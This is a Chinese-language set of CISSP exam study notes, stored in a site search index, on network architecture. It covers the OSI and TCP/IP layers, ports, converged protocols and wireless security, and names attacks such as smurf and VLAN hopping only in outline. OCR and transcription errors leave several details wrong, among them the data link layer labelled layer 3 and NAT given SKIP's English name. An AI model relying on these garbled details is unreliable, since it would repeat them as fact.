<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[cissp学习笔记（11）——网络安全架构与保护网络组件]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8811%EF%BC%89%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E4%BF%9D%E6%8A%A4%E7%BD%91%E7%BB%9C%E7%BB%84%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[在本章的考试大纲内容有：4) 通信与网络安全(设计和保护网络安全) A. 应用安全设计原则到网络架构中(例如， IP和非IP协议、分段)-A.1 0SI和TCP/IP模型-A.2 IP网络-A.3 应用多层协议(例如， DNP3)-A.4 汇聚协议(例如， FCoE、MPLS、VoIP、iSCSI)-A.5 软件定义网络-A.6 无线网络-A.7 使用密码学维护通信安全 B. 保护网络组件-B.1 硬件的操作(例如， 调制解调器、交换机、路由器、无线接入点、移动设备)-B.2 传输介质(例如， 有线、无线、光纤)-B.3 网络接入控制设备(例如， 防火墙、代理)-B.4 终端安全-B.5 内容分发网络-B.6 物理设备 11.1 OSI模型11.1.1 OSI模型的历史 OSI协议的开发为所有计算机系统建立了一个通用的通信结构或标准。实际的OSI协议从来没有得到过广泛采用， 但是OSI协议背后的理论， 也就是OSI模型， 却被大家很容易接受了。作为一个抽象的架构或理论模型， OSI模型说明了在理想硬件上的理想环境中协议应该怎样工作。因此， OSI模型已经成为一个所有协议都可以与其比较和对照的通用参考点。 11.1.2 OSI功能 OSI模型把网络任务划分到7个不同的层中。这些层用来具体表明信息流如何通过不同的通信层面。每一层都与上面的层和下面的层进行直接通信， 加上其他对等的层而形成通信伙伴系统。 OSI模型的真正优点在于它对网络互连实际工作方式的描述。在最基本的概念中， 网络通信出现在物理连接中(无诡物理连接是铜钱上的电子、光纤中的光子还是空气中的无线电信号)。物理设备建立了信道， 电子信号能够通过信道从一台计算机传递至另一台计算机。这些物理设备信道只是OSI模型定义的7种逻辑通信类型中的一种。OSI模型的每一层都通过一个逻辑信道与另一台计算机上的对等层进行通信。这样一来， 通过识别远程通信实体以及验证接收数据的来源， 基于OSI模型的协议就能够支持某种身份认证类型。 11.1.3 封装/解封装 基于OSI模型的协议采用了一种被称为封装的机制。通过每一层从上一层接收到数据后， 封装会给数据添加一个报头， 井且还可能添加一个报尾， 然后才将数据传输到下一层。随着报文在每一层的封装， 报文的大小也在不断增长。数据从OSI模型的应用层向下移动至物理层时， 在每一层都会发生封装。数据从OSI模型的物理层向上移动至应用层时， 在每一层发生的逆向操作称为解封装。封装/解封装过程如下所示： 应用层创建报文。 应用层将报文传递至表示层。 表示层通过向报文添加信息对它进行封装。信息通常只被添加到报文的开始部分(称为报头);不过， 某些层也会在报文的结尾部分添加内容(称为报尾) ， 如下图所示。 向下传递报文并且部加每层指定信息的过程将一直持续， 直到报文到达物理层。 在物理层， 报文被转换为表示比特的电子脉冲， 并且通过物理连接进行传输。 处于接收状态的计算机从物理连接中截获这些比特， 并且在物理层重新创建报文。 物理层将报文从比特转换为数据链路帧， 并且将报文向上发送至数据链路层。 数据链路层剥离信息， 并且将报文向上发送至网络层。 解封装的过程一直持续， 直到报文到达应用层。 当报文到达应用层时， 报文中的数据被发送至预期的软件接收者。 发送至应用层(第7层)上协议找中的报文被称为数据流。直至到达传输层(第4层)， 报文仍然保持着数据流的标签， 报文在传输层被称为段(使用TCP协议时的称呼)或数据报(使用UDP协议时的称呼)。在网络层(第3层)， 报文被称为数据包。在数据链路层(第3层)， 报文被称为l帧。在物理层(第l层)， 数据己经被转换为能够通过物理连接介质传输的比特。如下图： 11.1.4 OSI分层1. 物理层 物理层(第1层)从数据链路层接收帧， 并把帧转换为可以通过物理连接介质传送的比特。物理层还负责接收来自物理连接介质的比特， 并且将比特转换为数据链路层所使用的帧。物理层包含了会告诉协议如何应用硬件来发送和接收比特的多种设备驱动l􁻢}芋。物理层还涉及电气规范、协议和接口标准， 如下所示: EIAlTIA-232和EWTIA-449 X.21 高速串行接口(High-Speed Serial Interface， HSSI) 同步光网络(Synchronous Optical Network， SONET) V.24和V.35 通过设备驱动程序和这些标准， 物理层控制吞吐率、处理同步、管理线路噪音和介质访问， 并且决定使用数字、模拟或光脉冲信号在物理硬件接口上传输和接收数据。工作在物理层上的网络硬件设备包括网络接口卡(NIC)、集线器、中继器、集中器和放大器。这些设备执行基于硬件的信号操作。 2. 数据链路层 数据链路层(第2层)负责将来自网络层的数据包格式化为可以进行传输的适当格式。数据链路层内保留了一些技术特有的协议， 这些协议将数据包转换为适当格式的数据帧。一旦数据帧完成了格式化， 就会被发送至物理层进行传输。下面列出了数据链路层内驻留的协议: 串行线路网络协议(SLIP) 点对点协议(PPP) 地址解析协议(ARP) 反向地址解析协议(RARP) 二层转发协议(L2F) 二层隧道协议(L2TP) 点对点隧道协议(PPTP) 综合服务数字网络(ISDN) 在数据链路层上对数据执行的部分处理过程包括向数据帧添加硬件的源地址和目的地址。硬件地址指的是介质访问控制(MAC)地址， 它是一种用十六进制表示法表示的6字节(48比特)二进制地址(例如， 00-13-02-1F-58-F5)。地址的前三个字节(24比特)指示了物理网络接口的供应商或制造商。这被称为组织唯一标识符(Organizationally Unique Identifier， OUI)。 OUI由IEEE进行注册并控制发行。后三个字节(24位)代表一个独特的数字并被分配给该接口的制造商。没有两个设备可以在同一个本地以太网广播域中具有相同的” 同一个” 地址: 否则会发生地址冲突。 地址解析协议(ARP)和反向地址解析协议(RARP)。使用ARP将IP地址解析为MAC地址。使用MAC地址能够将某个网段(例如， 通过集线器的线路)上的通信数据从源系统定向至目标系统。使用RARP将MAC地址解析为IP地址。数据链路层包含两个子层: 逻辑链路控制(Logical Link Control， LLC)子层和MAC子层。工作在第2层(数据链路层)的网络硬件设备包括交换机和桥。 3. 网络层 网络层(第3层)负责向数据中添加路由和寻址信息。网络层接收来自于传输层的数据段， 并且通过添加信息创建数据包。数据包包括源IP 地址和目的IP地址。路由协议位于这一层， 包括下列协议: 网络控制报文协议(Internet Control Message Protocol，ICMP) 路由信息协议(Routing Information Protocol，RIP) 开放式最短路径优先(Open Shortest Path First， OSPF) 边界网关协议(Border Gateway Protocol， BGP) 网络组管理协议(Internet Group Management Protocol， IGMP) 网际协议(IP) 网际协议安全(IPSec) 互联网分组交换协议(Internetwork Packet Exchange， IPX) 网络地址转换(Simple Key Management for Internet Protocol， NAT) 网络简单密钥管理协议(SKIP) 网络层负责提供路由或传送信息， 但是不负责保证传输己进行验证(这个工作由传输层负责)。网络层还管理着错误检测和节点数据通信(也就是通信控制)。工作在第三层的网络层硬件设备包括路由器和桥式路由器。 4. 传输层 传输层(第4层)负责管理连接的完整性并控制会话。传输层接收来自于会话层的PDU(又名协议数据单元、数据包单元或数据负荷单元， 是一个在网络层流经的包含信息和数据的容器)并将其转换为数据段。传输层控制网络上设备的寻址或引用方式， 以及在节点(也被称为设备)之间建立通信连接， 还有定义会话的规则。会话规则指定每个数据段中可以包含多少数据、如何验证传输数据的完整性、如何确定数据是否丢失。会话规则在握手过程中建立。 传输层在两台设备之间建立了一个逻辑连接， 并且提供了能够确保数据传递的端到端传输服务。这一层包括针对分段、排序、错误检查、数据流控制、错误纠正、复用和网络服务优化的机制。下面列出了一些在传输层上运作的协议: 传输控制协议(TCP) 用户数据报协议(UDP) 顺序数据包交换(SPX) 安全套接宇层(SSL) 传输层安全(TLS) 5. 会话层 会话层(第5 层)负责在两台计算机之间建立、维护和终止通信会话。这一层管理对话模式或对话控制(单工、半双工、全双工)， 并为分组和恢复建立检查点， 以及重新传输上一次验证检查点以来失败或丢失的PDU。下面列出了一些在会话层上运行的协议: 网络文件系统例FS) 结构化查询语言(SQL) 远程过程调用(RPC) 通信会话能够以下列三种不同模式中的一种模式进行操作: 单工单向直接通信 半双工双向通信， 但是每次只有一个方向可以发送数据 全双工双向通信， 此时数据可以同时在两个方向上进行传输 6. 表示层 表示层(第6层)负责将从应用层接收的数据转换为遵从OSI模型的任何系统都能理解的格式。它向数据中强行添加通用的或标准的结构和格式化规则。表示层还负责加密和压缩。因此， 它成为网络和应用程序之间的接口。通过确保数据格式能够被两个系统支持， 表示层准许不同的应用程序通过网络交互。大多数文件或数据格式在这一层上出现， 包括图像、视频、音频、文档、电子邮件、Web页面和控制会话等格式。下面列出了表示层内存在的一些格式标准: 美国信息交换标准代码(ASCII) 扩充二进制编码的十进制交换码(EBCDIC) 标签图像文件格式(TIFF) 联合图像专家组(JPEG) 运动图像专家组(MPEG) 音乐设备数字接口(MIDI) 7. 应用层 应用层(第7层)负责将协议枝与用户的应用程序、网络服务或操作系统连接在一起。它准许应用程序与协议技进行通信。应用层确定远程的通信方是否可用和可访问， 还确保有足够的资源用于支持被请求的通信。应用程序并不位于应用层内; 相反， 传输文件、交换信息和连接远程终端等任务所需的协议和服务都在这一层。很多应用专用的协议也在应用层内， 例如下面这些协议: 超文本传输协议(HTTP) 文件传输协议(FTP) 行式打印机后台程序(LPD) 简单邮件传输协议(SMTP) 远程登录(Telnet) 普通文件传输协议(TFTP) 电子数据交换(EDI) 邮局协议第三版(POP3) 互联网消息访问协议(IMAP) 简单网络管理协议(SNMP) 网络新闻传输协议例NTP) 安全远程过程调用(S-RPC) 安全电子交易(SET) 有一种网络设备(或服务)工作在应用层， 名叫网关。但是， 应用层网关是一种特定类型的组件。网关作为协议转换工具使用。应用防火墙也工作在这一层。其他网络设备或过滤软件也可以在这一层监测或修改数据流。 11.2 TCP/IP模型 TCP/IP模型(也称为DARPA或DOD模型)仅由4层组成。TCP/IP模型的4层为:应用层、传输层(也称为主机到主机层)、网际层(有时称为互联网层)和网络接入层(然而网络接口层和网络访问层都会被用到)。 11.2.1 TCP/IP协议族概述 TCP/IP是使用最广泛的协议， 但它并不是一个单独的协议， 而是一个由许多单独的协议组成的协议枝(如下图所示)。 TCP/IP是一个基于开放式标准的、独立于平台的协议。然而， 这既是它的优点， 也是它的缺点。TCP/IP几乎可以在所有可用的操作系统中找到， 但是它耗用了相当数量的资源， 并且由于其设计目的是便于使用而不是安全， 因此容易遭到攻击。TCP/IP可以使用两个系统之间的VPN 链接进行安全保护。VPN链接通过加密增加了隐私性、机密性和身份认证， 并且维护数据的完整性。用于建立VPN的协议包括点对点隧道协议(PPTP)、二层隧道协议(L2TP)和网际协议安全(IPSec)。另一种提供协议级别安全性的方法是采用TCP 包装。通过在用户ID或系统ID的基础上限制对端口和资源的访问， TCP包装可以作为能够起到基本防火墙作用的应用程序。TCP包装是基于端口的访问控制形式。 1. 传输层协议 TCP/IP 两个主要的传输层协议是TCP和UDP。TCP是一个面向连接的协议， 而UDP是一个无连接的协议。当一个通信连接在两个系统之间建立起来时， 它通过端口的使用完成操作。TCP和UDP都有65536个端口。因为端口号是16位二进制数， 所以端口总数为2^16或65536，并且从0到65535进行编号。端口(也被称为套接宇)就是通信链接两端在传输数据时同意使用的地址号。这些端口中的前1024个(端口0-1023)被称为知名端口或服务端口， 这是由于它们己经按照标准分配给所支持的服务。端口1024-49151被称为己注册软件端口。这些端口具有注册到IANA的一个或多个互联软件产品， 目的是为试图连接其产品的客户端提供一个标准的端口编号系统。因为通常被客户端随机使用为源端口， 所以端口49152-65535被称为随机端口。在客户端和服务器之间协商初始服务或己注册端口之外的数据传输营造时， 某些网络连接服务也会使用这些随机端口。与UDP 协议相比， TCP 报头相对复杂。TCP 报头的长度为20 到60 字节， 这个报头被分为若干部分或宇段，如下： 比特数字 字段 16 源端口 16 目的端口 32 序列号 4 数据偏移量 4 预留使用 8 标志 16 窗口大小 16 校验和 16 紧急指针 可变 各种选项; 大小必须是32 比特的倍数 标志宇段可以包含对一个或多个标志或控制位的指示项。这些标志指示TCP数据包的功能， 并且请求接收方采用特定的方式进行响应。标志宇段的长度为8比特， 其中每个比特位置都表示单个标志或控制设置， 使用值1 可以设置打开， 使用值0则可以设置关闭。有些情况下， 可以一次性启用多个标志(也就是同时设置SYN和ACK标志时TCP三步握手中的第二个数据包)。标志控制比特如下： 标志比特指示项 各字 描述 CWR 拥塞窗口大小 用于管理拥塞链接上的传输 ECE ECN-Echo(明确拥塞通知) 用于管理拥塞链接上的传输 URG 紧急 指示紧急数据 ACK 确认 确认同步或关闭请求 PSH 推送 指示需要立即推送数据加以应用 RST 重置 导致TCP 会话立即断开连接 SYN 同步 请求使用新的序列号进行同步 FlN 结束 请求对TCP 会话的正常关闭 在IP报头协议字段中， 表示TCP的值为6(0x06)。协议宇段值是在每个IP数据包中都能找到的标签或标志， 它告知接收系统所接收数据包的类型。E 报头的协议字段指示下一个封装协议的标识， 也就是来自当前协议层的载荷包含的协议(例如， ICMP或IGMP)或上一层的协议(例如， TCP或UDP)。 用户数据报协议(UDP)也在OSI模型的第4层(传输层)上运作， 它是一种无连接的、”尽力而为的”通信协议。UDP不提供错误检测或纠正， 不使用序列， 不使用流量控制机制， 不使用预先建立的会话， 并且被认为是不可靠的。UDP具有极低的系统开销， 因此能够快速传输数据。UDP报头的长度为8个字节(64位)。UDP头被分为4个部分或字段(每个16位长): 源端口 目的端口 报文长度 校验和 2. 网络层协议和IP网络基础 IP等级 完整的A类子网可以支持16777214台主机， 完整的B类子网可以支持65534台主机， 而完整的C类子网则可以支持254台主机。D类子网被用于多擂， E类子网被保留给将来使用。子网划分的另一个选项是使用无类域间路由选择(Classless Inter-Domain Routing， CIDR)。CIDR没有使用采用完整点分十进制表示法的子网掩码， 而是使用掩码位。因此， CIDR通过斜线被添加在IP地址之后， 例如， 使用172.16.1.1/16代替255.255.0.0。与传统的子网掩码技术相比， CIDR 的一个重要优点是能够将多个不相邻的地址集组合在单个子网内。 ICMP 网络控制报文协议(ICMP)用于确定某个网络或特定链接的健康状况。pmg、traceroute、pathping以及其他网络管理工具都利用了ICMP。ping实用程序利用了ICMP的回应(echo)命令数据包， 并且使用它们对远程系统进行试探。ICMP的功能往往被各种基于带宽的拒绝服务攻击所利用， 例如， ping of death攻击、smurf攻击和pmg洪泛攻击。ping of death攻击发送一个畸形的大于65535字节(大于最大IPv4数据包大小)的数据包给一台计算机并试图让其崩溃。smurf攻击通过欺骗广播ping对目标网络产生巨大的流量， pmg数据包泛洪攻击是一个基本的拒绝服务(DoS)攻击， 它消耗目标可用的所有带宽。 IGMP 网络组管理协议(IGMP)允许系统支持多播。多播是将数据传输给多个特定的接收者。IP主机使用IGMP注册其动态的多播组成员。己连接的路由器也使用IGMP 来发现这些组。通过使用IGMP多播操作， 服务器在一开始就可以只传输单个数据信号， 从而不必为每个预定的接收者分别传输数据信号。借助于IGMP， 如果数据到达预定接收者的路径有分叉， 那么最初的单个信号就会在路由器处被复用。IP报头协议宇段中表示IGMP的值为2(Ox02) 。 ARP与反向ARP 对于逻辑和物理寻址模式的互操作性来说， 地址解析协议僻的与反向地址解析协议(RARP)是必不可少的。ARP 用于将IP地址(用于逻辑寻址的32位二进制数)解析为介质访问控制(MAC)地址(用于物理寻址的48位二进制数)–或者EUI-48–甚至EUI-64。通过使用MAC地址， 某个网段上(例如， 通过一个集线器的线缆)的通信从源系统定向至目的系统。RARP用于将MAC地址解析为IP地址。 3. 常见的应用层协议 远程登录(Telnet)， TCP端口23 这是一个终端仿真网络应用， 支持能够执行命令和运行应用程序的远程连通性， 但是不支持文件传输。 文件传输协议(FTP)， TCP端口20和21 这是一个支持文件交换的网络应用， 文件交换要求进行匿名的或特定的身份认证。 普通文件传输协议(TFTP)， UDP端口69 这是一个支持文件交换的网络应用， 文件交换不要求进行身份认证。 简单邮件传输协议(SMTP)， TCP端口25 这个协议用于从客户端向邮件服务器以及从一个邮件服务器向另一个邮件服务器传送邮件。 邮局协议(POP3)， TCP端口110 这个协议用于将邮件服务器收件箱中的邮件传送至邮件客户端。 互联网消息访问协议(IMAP)， TCP端口143 这个协议用于将邮件服务器收件箱中的邮件传输至邮件客户端。IMAP 比POP3 更安全， 并且能够从邮件服务器中取出邮件头， 在不必先下载至本地客户端的情况下就可以直接从邮件服务器中删除邮件。 动态主机配置协议(DHCP)， UDP 端口67 和68 DHCP将端口67用于服务器点对点响应， 将端口68用于客户端请求广播。在系统启动时， DHCP用于为系统指派TCP/IP配置设置。DHCP提供了对网络寻址的集中化控制。 超文本传输协议(HTTP)， TCP 端口80 这个协议用于从Web服务器向Web浏览器传送Web页面元素。 安全套接宇层(SSL)， TCP 端口443 这是一个在会话层上运作的、像VPN一样的安全协议。SSL原本设计用于支持安全的Web 通信。ITTPS)， 不过它能够保护任何应用层协议通信的安全。 行式打印后台程序(LPD)， TCP 端口515 这是一个用于管理打印作业以及向打印机发送打印作业的网络服务。 X视窗(X Window) ， TCP 端口6000-6063 这是一个用于命令行操作系统的GUI API。 引导协议(BootP)/动态主机配置协议(DHCP)， UDP端口67和68 这个协议用于通过自动分配IP配置以及下载基本的OS元素来连接无盘工作站和网络。BootP是DHCP的前身。 网络文件系统(NFS)， TCP端口2049 这是一个用于支持在不同系统之间共享文件的网络服务。 简单网络管理协议(SNMP)， UDP端口161(UDP端口162用于跟踪信息) 这个网络服务被用于通过从中央监控站轮询监控设备来收集网络健康和状况信息。 11.2.2 分层协议的应用 Web服务器和Web浏览器之间的通信工作在一个典型的网络连接上， HTTP封装在TCP中， TCP又封装在IP中， 而IP又封装在以太网中。这个封装可以用以下方式进行展示:[ Ethernet [ IP [ TCP [ HTTP ] ] ] ] 添加SSL/TLS加密通信会使得HTTP和TCP之间插入一种新的封装:[ Ethernet [ IP [ TCP [ SSL [ HTTP ] ] ] ] ] 同理， 又可以用诸如IPSec 的网络层加密进行进一步封装:[ Ethernet [ IPSec [ IP [ TCP [ SSL [ HTTP ] ] ] ] ] ] 如果一个网络阻止FTP但允许HTTP， 那么利用诸如HTTP隧道的工具就可以用来绕过这个限制。这导致出现以下所示的封装结构:[ Ethernet [ IP [ TCP [ HTTP [ FTP ] ] ] ] 通常情况下， HTTP带有与自己Web相关的载荷， 但通过HTTP隧道工具， 标准的有效载荷被另一个协议取代。这种错误封装甚至可以在较低的协议战中出现。例如， ICMP通常用于网络健康测试而不是一般通信。然而， 随着诸如Loki的出现， ICMP被转换为支持TCP通信的隧道协议。Loki的封装结构如下:[ Ethernet [ IP [ ICMP [ TCP [ HTTP ] ] ] ] ] 另一个关注的领域是， 对无界封装的支持将带来在VLAN之间跳跃的能力。VLAN通过逻辑标签分离实现网络分段。这种被称为跳跃攻击的攻击通过创建二次封装æEE 802.1Q VLAN标签的方式来进行:[ Ethernet [ VLAN1 [ VLAN2 [ IP [ TCP [ HTTP ] ] ] ] ] ] 通过这样的两次封装， 第一次遇到的交换机将剥离第一个VLAN标签， 接下来的交换机将被内部VLAN标签欺骗并将流量转移到其他VLAN中。 多层协议提供以下好处: 可以在更高层使用更为广泛的协议 封装可以和不同的层进行合作 在更为复杂的网络中支持灵活性和弹性 多层协议有以下几个缺点: 允许隐蔽信道 过滤机制可被绕行 逻辑上实现的网络段边界可以被逾越 11.2.3 TCP/IP的脆弱性 TCP/IP 的脆弱性有很多。在各种操作系统中， 不正确地实现TCP/IP堆栈很容易遭受缓冲区溢出攻击、SYN泛洪攻击、各种DoS攻击、碎片攻击、过长数据包攻击、欺骗攻击、中间人攻击、劫持攻击以及编码错误攻击。除了这些侵入式攻击以外， TCP/IP(以及大多数协议)还常常遭受通过监控或嗅探进行的被动式攻击。网络监控是对信息流量模式进行监控， 从而获得网络相关信息的行为。数据包嗅探是从网络中捕获数据包井期望从信息数据包内容中抽取出有用信息的行为。有效的数据包嗅探器可以抽取出用户名、密码、电子邮件地址、加密密钥、信用卡号、IP 地址和系统名等信息。 11.2.4 域名解析 寻址和命名操作是使网络通信成为可能的重要组成部分。理解在基于TCP/IP的网络中使用的寻址和命名的基本概念相当重要。 第三层或底层， 是MAC地址层。MAC地址或硬件地址是”永久”的物理地址。 第二层或中间层， 是IP 地址层。IP地址是在MAC地址上”临时”赋予的逻辑地址。 最顶层是域名。域名或计算机名是在IP地址上”临时”赋予的友好转换约定。 11.3 汇聚协议 以太网光纤通道(FCoE) 光纤通道是网络存储解决方案(存储区域网络(SAN)或网络附加存储(NAS))的一种形式，允许高达16Gbps的上行高速文件传输。设计目的是要在光纤线缆上运行， 之后支持在铜电缆上运行， 并提供更便直的选择。光纤通道通常需要自己专用的基础设施(单独的线缆)。然而， 以太网光纤通道(FCoE)可以用来支持在现有的网络基础设施上使用。FCoE用来在以太网网络上封装光纤通道通信， 通常需要10Gbps以太网以便支持光纤通道协议。通过这一技术， 光纤通道作为网络层或OSI第三层协议， 替换IP作为标准的以太网网络负载。 MPLS(多协议标签交换) MPLS(多协议标签交换)是一种高通过、高性能的网络技术， 它将数据在网络中以基于最短路径的标签而不是更长的网络地址进行传输。这种技术节省了传统的基于IP的路由过程， 这个过程可能相当复杂。此外， 设计MPLS的目的是通过封装处理广泛的协议。这样，网络就不局限于TCP/IP和兼容的协议。MPLS支持许多其他网络技术的使用， 包括T1/E1、ATM、帧中继、SONET和DSL。 互联网小型计算机系统接口(iSCSI) 互联网小型计算机系统接口(iSCSI)是一个基于IP的网络存储标准。这项技术可以用来支持位置独立的文件存储、传输， 以及对局域网、广域网的检索， 或者公共互联网连接。iSCSI通常被认为是光纤通道的一种低成本替代方案。 IP语音(VoIP) IP语音(VoIP)是用于在TCP/IP网络上传输语音和/或数据的一种隧道机制。 软件定义网络(SDN) 软件定义网络(SDN)是一种独特的对网络进行操作、设计和管理的方法。该概念基于这样一个理论， 即传统网络设备配置的复杂性(如路由器和交换机)经常强迫组织依附于某单一的设备厂商(如思科)， 这不仅限制了网络的灵活性， 而且难以应对不断变化的物理和商业条件。SDN 旨在把控制层(即网络服务的数据传输管理)和基础设施层(即硬件和基于硬件的设置)分离。此外， 它还移除了IP寻址、子网、路由以及诸如此类从需求到被固化程序编码或解释的传统网络概念。它允许数据传输路径、通信决策树以及流量控制在SDN控制层是虚拟化的， 而不是在每个设备的基础硬件上进行处理。 11.4 内容分发网络 内容分发网络(CDN)或内容转发网络， 是资源服务的集合， 被部署在互联网的许多数据中心以提供低延迟、高性能和所承载内容的高可用性。CDN通过分布式数据主机提供客户所需的多媒体性能质量， 而不是将媒体内容存储在单一位置的单一主机上， 并向互联网的其他地方进行内容分发。这是一种地理和逻辑负载均衡的结果。在所有资源发起请求的负荷下， 没有哪个服务器或群集服务器会变得有压力， 且托管服务器变得更接近于发起请求的客户。总的结果是较低的延迟和更高质量的吞吐量。 11.5 无线网络11.5.1 保护无线接入点 无线覆盖单元是在物理环境中无线设备可以接入到无线接入点的区域。无线覆盖单元可导致环境中的安全泄露， 允许攻击者轻易连接到无线网络。应该调整无线接入点的强度， 以确保用户接入认证的最大化和攻击者接入的最小化。做这些工作需要单独的无线接入点的独特位置、外罩防护以及噪声屏蔽。 部署无线网络时， 应该部署无线接入点并使用基础设施模式而不是点对点模式。点对点模式意味着任意两个无线网络设备， 包括两个无线网络接口卡(NIC) ， 能在不需要中心控制认证的情况下进行通信。基础设施模式意味着需要一个无线接入点， 系统上的无线网卡之间不能互联。无线接入点的无线网络接入控制应该进行强化。 基础设施模式的概念有几个变化模式， 包括独立模式、有线扩展模式、企业扩展模式和桥接模式。独立模式指无线接入点连接无线客户端但是没有提供任何有线资源。无线接入点服务就像一个无线交换机。有线扩展模式指无线接入点连接无线客户端到有线网络。企业扩展模式指多个无线接入点(WAP)用来连接巨大的物理区域到同一个有线网络。每一个无线接入点都使用相同的扩展服务集标识符(ESSID)， 因此客户端能在更换区域时保持网络连接， 即使它们的无线阿卡从一个无线接入点到另一个无线接入点改变关联。桥接模式发生在当无线连接用于连接两个有线网络的情况，这通常发生在有线桥接不方便时。 11.5.2 保护SSID SSID广播由WAP通过信标帧进行特殊传输。它允许在无线覆盖范围内的任意无线网卡尽可能简单地进行无线网络连接。然而， 这个默认的SSID广播应禁用以便保持无线网络的私密性。即便如此， 攻击者仍然可以用无线嗅探器借由无线客户端和WAP之间的传输发现SSID。因此， 禁用SSID广播并不是一个真正的安全机制。相反， 应使用WPA2作为一个可靠的身份认证和加密解决方案而不是试图隐藏无线网络的存在。 11.5.3 执行现场勘测 用于发现不需要无线接入的物理环境区域的一种方法是执行现场勘测。现场勘测的过程是调查在环境中部署无线接入点所需的信号强度。这项任务通常包括携带便携式无线设备进行现场行走观察， 留意无线信号的强度， 并据此在建筑图上进行标注。执行现场勘测来确保无线设备使用的所有位置具备足够的信号强度， 同时在同一时间， 最大限度地减少或消除不允许无线接入位置(公共区域、跨楼层、其他房间或建筑夕阳的无线信号。现场勘测对于评估现有无线网络的部署、扩展当前应用的计划以及未来部署计划非常有用。 11.5.4 使用加密协议 WEP 有线等效保密(WEP)被定义为IEEE 802.11标准， 目的在于为无线网络提供与有线或通信电缆网络相同级别的安全性和加密。WEP提供无线传输保护中对数据包嗅探和窃听攻击的防护。它可以被配置来防止未经授权的无线网络访问。WEP使用预定义的共享密钥， 然而并非典型的动态对称密码方案， 共享密钥是静态的并在所有的无线接入点和设备接口之间进行共享。此密钥用于在无线链路传输之前加密数据包， 从而提供机密性保护。哈希值用来验证接收的数据包在传输过程中不被修改或遭受损坏。因此， WEP也提供完整性保护。WEP在发布的同时几乎就被破解。 WPAWPA 基于LEAP和TKIP加密体系并通常使用安全加密用于认证。遗憾的是， 使用单个静态的密码将彻底损坏WPA的安全性。攻击者可以简单地在WPA网络中运行暴力猜测攻击以发现密码。如果密码是14位字符或更长， 这通常是时间问题， 但并非不可能无法破解。此外， 无论是WPA的LEAP还是TKIP加密选工页， 目前都可以使用不同的破解技术进行破解。尽管WPA比WEP更复杂，但WPA不再提供长期可靠的安全。 WPA2一种新的确保无线安全的方法被开发出来， 井且截至目前仍然被认为是安全的。这就是被称为802.11i或WPA2的修订方案。这是一种新的加密方案， 称为计数器模式密码块链接消息认证码协议(Counter Mode Cipher Block Chaining Message Authentication Code Protocol， CCMP)， 这是基于AES的加密方案。到目前为止， 还没有实际的攻击能破坏正确配置的WPA2无线网络加密。 802.1X/EAP WPA 和WPA2 都支持称为企业认证的802.1X/EAP ， 这是一个标准的基于端口的网络访问控制协议， 确保客户端在没有发生正确认证时不能和资源发生通信联系。802.1X是一种有效允许无线网络利用现有的网络基础设施进行认证服务的协议。通过使用802.1x ， 其他技术和解决方案， 如RADIUS、TACACS、证书、智能卡、令牌和生物识别设备， 可以被集成到无线网络中并提供包括进行交互和多因子认证的技术。EAP(Extensible Authentication Protocol， 可扩展认证协议)是认证框架而不是具体的认证机制。实际上， EAP可以允许新的认证技术与现有无线或点对点连接技术兼容。 PEAP PEAP(protected EAP， 受保护的可扩展认证协议)通过TLS隧道封装EAP方法， 提供了认证和潜在的加密功能。由于EAP最初被设计用于在物理上隔离通道， 因此假定固定通路， EAP通常是不加密的。所以， PEAP可以为EAP方法提供加密。 LEAP LEAP(Lightweight EAP， 轻量级可扩展认证协议)是Cisco专有的， 用于WPA替代TKIP。在802.11i/WAP2系统被批准为标准之前， 它被开发用于应对TKIP地址不足的情况。一种称为Asleap的攻击工具在2004年发布， 该工具可以破解LEAP提供的最终脆弱保护。如果可能， 应尽量避免使用LEAP并建议使用EAP-TLS作为一种替代。但如果己使用LEAP， 强烈推荐使用复杂的密码。 MAC过滤器 MAC过滤器是一系列授权的无线客户端接口MAC地址， 这些地址被无线接入点用来阻断那些未经授权的设备。虽然这是一个有用的特性， 但是它难以管理， 并且往往只使用在小型、静态的环境中。此外， 黑客通过基本的无线黑客工具就可以发现有效客户端的MAC地址， 然后伪装成该地址对无线客户端发起攻击。 TKIP TKIP(Temporal Key Integrity Protocol， 临时密钥完整性协议)被设计为替代WEP而不需要更换无线硬件。TKIP在无线网络802.11 WPA的名称下得到应用。TKIP改进了很多， 包括密钥的混合功能， 该功能在使用RC4算法密钥进行加密之前结合了初始向量(IV， 一个随机数)与安全的根密钥;一个序列计数器被用来防止报文重放攻击; 同时还使用了一种强大的称为Michael的完整性检查。 CCMPCCMP(计数器模式密码块链接消息认证码协议)用于取代WEP和TKIP/WPA。CCMP使用AES(高级加密标准)和128位的密钥。CCMP是802.11i制定的在802.11无线网络中首选的标准安全协议。到目前为止， 还没有攻击能成功破解AES/CCMP加密。 11.5.5 天线位置的确定 在部署无线网络时， 天线位置应该是一个值得关注的问题。不要在适当的现场勘测完成之前就固定到一个特定的位置。将无线接入点和/或它的天线放置在一个可能的位置， 然后测试不同位置的信号强度和连接质量。只有在确认该潜在的天线位置提供了令人满意的连接后， 才应该进行永久性的固定。在寻找最佳天线位置时应考虑以下准则: 使用中央位置 避开固体物理障碍物 避开反射或其他平整的金属表面 避开电气设备 11.5.6 天线类型 有很多各种各样的天线类型可用于无线客户端和基站。许多设备可以用更强的(例如， 信号增强)天线替代原有的标准天线。标准的直杆或杆天线是一种全向天线， 可以在垂直于天线本身的方向上发送和接收信号。在大多数基站和一些客户端设备上可发现这种天线类型。这种类型的天线有时也被称为基础天线或橡胶天线(事实上大多数天线由橡胶涂层覆盖)。 11.5.7 调整功率水平控制 一些无线接入点提供了物理或逻辑调整天线功率水平的功能。功率控制通常由厂家设定为适用于大多数的情况。但是， 如果在进行现场勘测和调整天线位置后， 无线信号仍然无法令人满意， 功率水平调整可能是必要的。然而， 要记住改变信道， 避免反射和信号散射表面以减少干扰， 往往可以更有效地改善连接可靠性。 当调整功率水平时， 要进行微调， 而不是试图将设置最大化或最小化。此外， 需要注意初始/默认设置以便必要时可以返回到该设置。在每一次功率水平调整后， 在重新进行现场勘测和质量测试之前重置/重新启动无线接入点。有时降低功率水平可以提高性能。需要记住， 一些无线接入点能够提供比一些国家许可规定更高的功率水平。 11.5.8 使用强制门户 强制门户是一种认证技术， 它将新连接的无线Web 